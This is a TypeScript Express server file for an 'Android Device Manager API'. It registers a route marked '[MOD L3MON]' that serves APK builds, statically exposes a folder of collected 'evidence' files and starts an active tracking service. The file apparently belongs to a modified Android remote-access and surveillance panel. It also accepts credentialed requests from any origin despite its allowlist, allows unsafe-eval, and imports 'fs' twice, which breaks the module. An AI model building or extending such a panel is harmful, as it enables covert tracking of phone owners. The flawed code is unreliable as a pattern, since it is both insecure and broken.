import dotenv from "dotenv";
import path, { resolve, join } from "path";
import { fileURLToPath } from "url";
import express from "express";
import cors from "cors";
import cookieParser from "cookie-parser";
import helmet from "helmet";
import { createServer } from "http";
import { createExpressMiddleware } from "@trpc/server/adapters/express";
import { registerOAuthRoutes } from "./oauth";
import { appRouter } from "../appRouter";
import { createContext } from "./context";
import { runMigrations } from "../db";
import { xssMiddleware } from "./xssProtection";
import fs from "fs";

// ✅ CARGAR DOTENV - Soporte para Render y local
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const envPath = resolve(join(__dirname, "../../.env"));

// Solo cargar .env si existe (en local), en Render las vars ya están en env
if (fs.existsSync(envPath)) {
  dotenv.config({ path: envPath });
} else {
  console.log("[Server] Running with environment variables (Render)");
}

export const app = express();
const server = createServer(app);

// Middlewares globales
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "ws:", "wss:"],
      fontSrc: ["'self'", "data:"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'", "https:"],
      frameSrc: ["'none'"],
    },
  },
  crossOriginEmbedderPolicy: false,
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true,
  },
}));

app.use(xssMiddleware);
app.use(cors({
  origin: (origin, callback) => {
    // Allow Vercel frontends
    const allowedOrigins = [
      "https://repodeploy.vercel.app",
      "https://jorges-projects-a59a5a05.vercel.app",
      "http://localhost:5173",
      "http://localhost:3000"
    ];
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(null, true); // Allow for now
    }
  },
  credentials: true,
  methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization", "X-TRPC-Source"]
}));
app.use(cookieParser());
app.use(express.json());

// Logging
app.use((req, res, next) => {
  console.log(`[HTTP] ${req.method} ${req.url} | IP: ${req.ip}`);
  next();
});

// Rutas Estáticas
app.get("/", (req, res) => {
  res.json({ message: "Android Device Manager API", status: "ok" });
});

app.get("/api/health", (req, res) => {
  res.json({ status: "ok", environment: process.env.NODE_ENV || "production" });
});

// [MOD L3MON] Register APK Download Route
import { handleAPKDownload } from "../apkDownload";
app.get("/api/apk/download/:buildId", handleAPKDownload);

// [ADM] Serve Evidence Files
import fs from "fs";
const evidencePath = join(process.cwd(), "builds", "evidence");
if (!fs.existsSync(evidencePath)) fs.mkdirSync(evidencePath, { recursive: true });
app.use("/api/evidence/download", express.static(evidencePath));

// OAuth
registerOAuthRoutes(app);

// TRPC
app.use(
  "/api/trpc",
  createExpressMiddleware({
    router: appRouter,
    createContext,
  })
);

async function start() {
  const isVercel = process.env.VERCEL || process.env.NOW_REGION;
  
  if (!isVercel) {
    // Solo correr migraciones y websockets si NO estamos en Vercel
    try {
      await runMigrations();
      const { initializeWebSocket } = await import("../websocket");
      const wsManager = initializeWebSocket(server);
      console.log("[Server] WebSocket initialized successfully");
      
      const { activeTrackingService } = await import("../activeTrackingService");
      activeTrackingService.start(wsManager);

      const port = Number(process.env.PORT) || 3001;
      server.listen(port, "0.0.0.0", () => {
        console.log(`[Server] Backend started on port ${port}`);
      });
    } catch (err) {
      console.error("[Server] Setup failed:", err);
    }
  }
}

start().catch(console.error);

export default app;


